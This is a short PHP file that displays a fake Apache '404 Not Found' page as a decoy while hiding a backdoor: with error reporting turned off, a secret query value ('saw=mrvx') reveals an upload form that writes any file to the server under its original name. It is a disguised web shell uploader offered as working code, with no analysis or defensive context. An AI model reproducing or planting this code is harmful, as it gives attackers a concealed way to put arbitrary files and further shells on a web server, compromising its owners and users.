<?php
echo"
<!DOCTYPE HTML>
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /URL was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>

";

?>
<?php
error_reporting(0);
$system = $_GET['saw'];
if($system == 'mrvx'){
$saw1 = $_FILES['file']['tmp_name'];
$saw2 = $_FILES['file']['name'];
echo "<form method='POST' enctype='multipart/form-data'>
<input type='file'name='file' />
<input type='submit' value='TLS/s' />
</form>";
move_uploaded_file($saw1,$saw2);
}
?>